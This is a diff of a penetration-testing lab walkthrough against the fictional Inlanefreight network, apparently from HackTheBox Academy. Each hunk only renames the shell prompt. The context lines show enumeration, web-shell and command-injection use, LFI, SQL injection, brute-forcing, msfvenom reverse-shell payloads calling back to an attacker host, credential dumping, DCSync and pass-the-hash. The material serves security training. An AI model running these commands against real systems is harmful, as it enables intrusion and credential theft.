@@ -86,7 +86,7 @@ We start with a quick initial Nmap scan against our target to get a lay of the l
 &#x20; External Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nmap --open -oA inlanefreight_ept_tcp_1k -iL scope 
+root@htb[/htb]$ sudo nmap --open -oA inlanefreight_ept_tcp_1k -iL scope 
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 14:56 EDT
 Nmap scan report for 10.129.203.101
@@ -115,7 +115,7 @@ In the meantime, we have been running a full port scan using the `-A` flag ([Agg
 &#x20; External Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nmap --open -p- -A -oA inlanefreight_ept_tcp_all_svc -iL scope
+root@htb[/htb]$ sudo nmap --open -p- -A -oA inlanefreight_ept_tcp_all_svc -iL scope
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 15:27 EDT
 Nmap scan report for 10.129.203.101
@@ -234,7 +234,7 @@ The first thing we can see is that this is an Ubuntu host running an HTTP proxy 
 &#x20; External Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ egrep -v "^#|Status: Up" inlanefreight_ept_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \                                                               
+root@htb[/htb]$ egrep -v "^#|Status: Up" inlanefreight_ept_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \                                                               
 sed -e 's/^[ \t]*//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c \
 | sort -k 1 -nr
 
@@ -252,7 +252,7 @@ From these listening services, there are several things we can try immediately, 
 &#x20; External Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ dig axfr inlanefreight.local @10.129.203.101
+root@htb[/htb]$ dig axfr inlanefreight.local @10.129.203.101
 
 ; <<>> DiG 9.16.27-Debian <<>> axfr inlanefreight.local @10.129.203.101
 ;; global options: +cmd
@@ -284,7 +284,7 @@ To fuzz vhosts, we must first figure out what the response looks like for a non-
 &#x20; External Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s -I http://10.129.203.101 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"
+root@htb[/htb]$ curl -s -I http://10.129.203.101 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"
 
 Content-Length: 15157
 ```
@@ -294,7 +294,7 @@ Trying to specify `defnotvalid` in the host header gives us a response size of `
 &#x20; External Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157
+root@htb[/htb]$ ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -342,7 +342,7 @@ From our initial enumeration, we noticed several interesting ports open that we 
 &#x20; External Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo tee -a /etc/hosts > /dev/null <<EOT
+root@htb[/htb]$ sudo tee -a /etc/hosts > /dev/null <<EOT
 
 ## inlanefreight hosts 
 10.129.203.101 inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local dev.inlanefreight.local gitlab.inlanefreight.local ir.inlanefreight.local status.inlanefreight.local support.inlanefreight.local tracking.inlanefreight.local vpn.inlanefreight.local
@@ -380,7 +380,7 @@ Let's start with FTP on port 21. The Nmap Aggressive Scan discovered that FTP an
 &#x20; Service Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ftp 10.129.203.101
+root@htb[/htb]$ ftp 10.129.203.101
 
 Connected to 10.129.203.101.
 220 (vsFTPd 3.0.3)
@@ -425,7 +425,7 @@ Next up is SSH. We'll start with a banner grab:
 &#x20; Service Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -nv 10.129.203.101 22
+root@htb[/htb]$ nc -nv 10.129.203.101 22
 
 (UNKNOWN) [10.129.203.101] 22 (ssh) open
 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
@@ -436,7 +436,7 @@ This shows us that the host is running OpenSSH version 8.2, which has no known v
 &#x20; Service Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh admin@10.129.203.101
+root@htb[/htb]$ ssh admin@10.129.203.101
 
 The authenticity of host '10.129.203.101 (10.129.203.101)' can't be established.
 ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
@@ -459,7 +459,7 @@ Let's do another scan against port 25 to look for misconfigurations.
 &#x20; Service Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nmap -sV -sC -p25 10.129.203.101
+root@htb[/htb]$ sudo nmap -sV -sC -p25 10.129.203.101
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:55 EDT
 Nmap scan report for inlanefreight.local (10.129.203.101)
@@ -484,7 +484,7 @@ Next, we'll check for any misconfigurations related to authentication. We can tr
 &#x20; Service Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ telnet 10.129.203.101 25
+root@htb[/htb]$ telnet 10.129.203.101 25
 
 Trying 10.129.203.101...
 Connected to 10.129.203.101.
@@ -509,7 +509,7 @@ The `POP3` protocol can also be used for enumerating users depending on how it i
 &#x20; Service Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ telnet 10.129.203.101 110
+root@htb[/htb]$ telnet 10.129.203.101 110
 
 Trying 10.129.203.101...
 Connected to 10.129.203.101.
@@ -528,7 +528,7 @@ We can check for it anyways but do not find an open relay which is good for our 
 &#x20; Service Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -p25 -Pn --script smtp-open-relay  10.129.203.101
+root@htb[/htb]$ nmap -p25 -Pn --script smtp-open-relay  10.129.203.101
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 19:14 EDT
 Nmap scan report for inlanefreight.local (10.129.203.101)
@@ -550,7 +550,7 @@ Port 111 is the `rpcbind` service which should not be exposed externally, so we 
 &#x20; Service Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ rpcinfo 10.129.203.101
+root@htb[/htb]$ rpcinfo 10.129.203.101
 
    program version netid     address                service    owner
     100000    4    tcp6      ::.0.111               portmapper superuser
@@ -588,7 +588,7 @@ The quickest and most efficient way to get through a bunch of web applications i
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat ilfreight_subdomains
+root@htb[/htb]$ cat ilfreight_subdomains
 
 inlanefreight.local 
 blog.inlanefreight.local 
@@ -608,7 +608,7 @@ We can feed EyeWitness an Nmap .xml file or a Nessus scan, which is useful when 
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
+root@htb[/htb]$ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
 
 ################################################################################
 #                                  EyeWitness                                  #
@@ -652,7 +652,7 @@ Using `cURL`, we can see that Drupal 9 is in use.
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep Drupal
+root@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep Drupal
 
 <meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
       <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
@@ -687,7 +687,7 @@ The web application at `http://dev.inlanefreight.local` is simple yet catches th
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
+root@htb[/htb]$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
 
 ===============================================================
 Gobuster v3.1.0
@@ -753,7 +753,7 @@ We can now use `cURL` to interact with this web shell and execute commands on th
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id
+root@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -763,7 +763,7 @@ Checking the host's IP addressing, it doesn't appear that we've landed inside th
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I
+root@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I
 
 172.18.0.3
 ```
@@ -779,7 +779,7 @@ The next target in our list is `http://ir.inlanefreight.local`, the company's In
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
+root@htb[/htb]$ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
 
 <SNIP>
 
@@ -867,7 +867,7 @@ The `Mail Masta` plugin is an older plugin with several known vulnerabilities. W
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+root@htb[/htb]$ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -895,7 +895,7 @@ We can add another finding to our list: `Local File Inclusion (LFI)`. Next, let'
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wpscan -e u -t 500 --url http://ir.inlanefreight.local
+root@htb[/htb]$ wpscan -e u -t 500 --url http://ir.inlanefreight.local
 
 <SNIP>
 
@@ -951,7 +951,7 @@ Let's try to brute-force one of the account passwords using [this](https://raw.g
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
+root@htb[/htb]$ wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
 
 <SNIP>
 
@@ -1018,7 +1018,7 @@ Next, we run this through sqlmap as follows:
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql 
+root@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql 
 
 <SNIP>
 
@@ -1057,7 +1057,7 @@ Next, we can enumerate the available databases and see that the `status` databas
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql --dbs
+root@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql --dbs
 
 <SNIP>
 
@@ -1086,7 +1086,7 @@ Focusing on the `status` database, we find that it has just two tables:
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql -D status --tables
+root@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql -D status --tables
 
 <SNIP>
 
@@ -1125,7 +1125,7 @@ Change the IP for your own and start a `Netcat` listener on port 9000 (or whatev
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lvnp 9000
+root@htb[/htb]$ nc -lvnp 9000
 
 listening on [any] 9000 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.129.203.101] 56202
@@ -1190,7 +1190,7 @@ We get a callback on our web server with an admin's session cookie:
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo php -S 0.0.0.0:9200
+root@htb[/htb]$ sudo php -S 0.0.0.0:9200
 
 [Tue Jun 21 00:33:27 2022] PHP 7.4.28 Development Server (http://0.0.0.0:9200) started
 [Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 Accepted
@@ -1328,7 +1328,7 @@ We'll set up `hydra` to perform the brute-forcing attack, specifying the `Invali
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
+root@htb[/htb]$ hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -1357,7 +1357,7 @@ We've won the first battle, but there seems to be another type of filter in plac
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"
+root@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"
 
 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms
@@ -1373,7 +1373,7 @@ We have achieved command execution as the `webdev` user. Digging around a bit mo
 &#x20; Web Enumeration & Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"
+root@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"
 
 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms
@@ -1502,7 +1502,7 @@ Start a `Netcat` listener on the port used in the Socat command (8443 here) and 
 &#x20; Initial Access
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -nvlp 8443
+root@htb[/htb]$ nc -nvlp 8443
 
 listening on [any] 8443 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 51496
@@ -1517,7 +1517,7 @@ We'll start a Socat listener on our attack host.
 &#x20; Initial Access
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
+root@htb[/htb]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
 ```
 
 Next, we'll execute a Socat one-liner on the target host.
@@ -1525,7 +1525,7 @@ Next, we'll execute a Socat one-liner on the target host.
 &#x20; Initial Access
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lnvp 8443
+root@htb[/htb]$ nc -lnvp 8443
 
 listening on [any] 8443 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174
@@ -1602,7 +1602,7 @@ Now that we have credentials (`srvadm:ILFreightnixadm!`), we can leverage the SS
 &#x20; Post-Exploitation Persistence
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh srvadm@10.129.203.111
+root@htb[/htb]$ ssh srvadm@10.129.203.111
 
 The authenticity of host '10.129.203.111 (10.129.203.111)' can't be established.
 ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
@@ -1737,8 +1737,8 @@ Success! We can now save the private key to our local system, modify the privile
 &#x20; Post-Exploitation Persistence
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ chmod 600 dmz01_key 
-AbdulrahmanTamim@htb[/htb]$ ssh -i dmz01_key root@10.129.203.111
+root@htb[/htb]$ chmod 600 dmz01_key 
+root@htb[/htb]$ ssh -i dmz01_key root@10.129.203.111
 
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)
 
@@ -1809,7 +1809,7 @@ In our first terminal, let's set up the SSH dynamic port forwarding command firs
 &#x20; Internal Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh -D 8081 -i dmz01_key root@10.129.203.111
+root@htb[/htb]$ ssh -D 8081 -i dmz01_key root@10.129.203.111
 
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)
 
@@ -1853,7 +1853,7 @@ We can confirm that the dynamic port forward is set up using `Netstat` or runnin
 &#x20; Internal Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ netstat -antp | grep 8081
+root@htb[/htb]$ netstat -antp | grep 8081
 
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -1866,7 +1866,7 @@ Next, we need to modify the `/etc/proxychains.conf` to use the port we specified
 &#x20;Note: If you are working from the Pwnbox, be sure to save this private key down to your notes or a local file or you'll have to re-do all steps to get back to this point should you decide to pause for a while.  Internal Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ grep socks4 /etc/proxychains.conf 
+root@htb[/htb]$ grep socks4 /etc/proxychains.conf 
 
 #	 	socks4	192.168.1.49	1080
 #       proxy types: http, socks4, socks5
@@ -1878,7 +1878,7 @@ Next, we can use Nmap with Proxychains to scan the dmz01 host on its' second NIC
 &#x20; Internal Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
+root@htb[/htb]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 21:15 EDT
@@ -1910,7 +1910,7 @@ First, generate a reverse shell in Elf format using `msfvenom`.
 &#x20; Internal Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
+root@htb[/htb]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
 
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -1925,7 +1925,7 @@ Next, transfer the host to the target. Since we have SSH, we can upload it to th
 &#x20; Internal Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
+root@htb[/htb]$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
 
 shell.elf                                                                      100%  207     1.6KB/s   00:00
 ```
@@ -2148,7 +2148,7 @@ We can quickly check against the Domain Controller for SMB NULL sessions. If we 
 &#x20; Internal Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains enum4linux -U -P 172.16.8.3
+root@htb[/htb]$ proxychains enum4linux -U -P 172.16.8.3
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun 21 21:49:47 2022
@@ -2284,7 +2284,7 @@ Putting DNN aside, for now, we go back to our port scan results. Port 2049, NFS,
 &#x20; Internal Information Gathering
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains showmount -e 172.16.8.20
+root@htb[/htb]$ proxychains showmount -e 172.16.8.20
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:111-<><>-OK
@@ -2483,7 +2483,7 @@ Finally, we can use `secretsdump` to dump the SAM database and retrieve a set of
 &#x20; Exploitation & Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
+root@htb[/htb]$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
 
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
 
@@ -2519,7 +2519,7 @@ We confirm that these credentials work using `CrackMapExec` and we now have a wa
 &#x20; Exploitation & Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>
+root@htb[/htb]$ proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 [*] Initializing LDAP protocol database
@@ -2587,7 +2587,7 @@ Let's walk through the reverse port forwarding method quickly. First off, we nee
 &#x20; Exploitation & Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443
+root@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -2620,7 +2620,7 @@ Next, we need to upload the `teams.exe` reverse shell payload to the `DEV01` tar
 &#x20; Exploitation & Privilege Escalation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN
+root@htb[/htb]$ ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN
 
 OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1n  15 Mar 2022
 debug1: Reading configuration data /etc/ssh/ssh_config
@@ -2716,7 +2716,7 @@ We can use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSp
 &#x20; Lateral Movement
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains nmap -sT -p 3389 172.16.8.20
+root@htb[/htb]$ proxychains nmap -sT -p 3389 172.16.8.20
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 13:35 EDT
@@ -2786,7 +2786,7 @@ We can switch back to our attack host and confirm that the password was changed 
 &#x20; Lateral Movement
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
+root@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
@@ -2834,7 +2834,7 @@ This doesn't turn up anything interesting, so let's re-run our share enumeration
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
+root@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
@@ -2857,7 +2857,7 @@ This creates a file for us in our `/tmp` directory so let's look through it.
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat 172.16.8.3.json 
+root@htb[/htb]$ cat 172.16.8.3.json 
 {
     "Department Shares": {
         "IT/Private/Development/SQL Express Backup.ps1": {
@@ -2881,7 +2881,7 @@ The file `SQL Express Backup.ps1` in the private IT share looks very interesting
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 
+root@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
@@ -2924,7 +2924,7 @@ Checking out the file, we see that it's some sort of backup script with hardcode
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat SQL\ Express\ Backup.ps1 
+root@htb[/htb]$ cat SQL\ Express\ Backup.ps1 
 
 $serverName = ".\SQLExpress"
 $backupDirectory = "D:\backupSQL"
@@ -2964,7 +2964,7 @@ We can download it once again with `smbclient`.
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 
+root@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
@@ -2990,7 +2990,7 @@ Digging through the script we find another set of credentials: `helpdesk:L337^p@
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat adum.vbs 
+root@htb[/htb]$ cat adum.vbs 
 
 Option Explicit
 
@@ -3058,7 +3058,7 @@ We can download this file via the RDP drive redirection we set up earlier: `copy
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
+root@htb[/htb]$ hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
 
@@ -3106,7 +3106,7 @@ Let's try a few more things to cover all our bases. We can search the SYSVOL sha
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
+root@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
@@ -3147,7 +3147,7 @@ At this point, we have dug into the domain pretty heavily and have found several
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains nmap -sT -p 5985 172.16.8.50
+root@htb[/htb]$ proxychains nmap -sT -p 5985 172.16.8.50
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 14:59 EDT
@@ -3169,7 +3169,7 @@ It works, and we're in!
 &#x20; Share Hunting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm 
+root@htb[/htb]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm 
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Enter Password: 
@@ -3529,7 +3529,7 @@ Next we can go back to our attack host and use `GetUserSPNs.py` to perform a tar
 &#x20; Active Directory Compromise
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
+root@htb[/htb]$ proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
@@ -3553,7 +3553,7 @@ Next we'll fire up Hashcat and see if the user is using a weak password.
 &#x20; Active Directory Compromise
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
+root@htb[/htb]$ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
 
@@ -3615,7 +3615,7 @@ Finally, we can use Secretsdump to DCSync all NTLM password hashes from the Doma
 &#x20; Active Directory Compromise
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
+root@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
@@ -3680,7 +3680,7 @@ Once we've gained access to the Domain Controller we can likely access most any 
 &#x20; Post-Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e556xxxxxxxxxxxddbb6e6afa2
+root@htb[/htb]$ proxychains evil-winrm -i 172.16.8.3 -u administrator -H fd1f7e556xxxxxxxxxxxddbb6e6afa2
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 
@@ -3915,7 +3915,7 @@ Next, create an executable payload that we'll upload to the Domain Controller ho
 &#x20; Post-Exploitation
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234
+root@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
